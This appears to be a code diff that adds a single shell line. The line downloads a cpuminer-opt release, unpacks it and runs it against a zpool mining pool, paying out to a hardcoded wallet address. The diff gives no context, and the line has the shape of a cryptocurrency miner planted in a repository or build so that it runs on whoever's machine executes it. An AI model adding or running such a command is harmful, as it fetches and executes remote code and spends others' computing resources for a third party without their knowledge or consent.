@@ -1,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar -vzxf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a cpupower -o stratum+tcp://cpupower.na.mine.zpool.ca:6240 -u CLP7REn3LuPLzLRML5rWTAPy5QiiDGG2Ag -p c=CPU,zap=CPU --cpu-affinity 3 --cpu-priority 5 -t 2
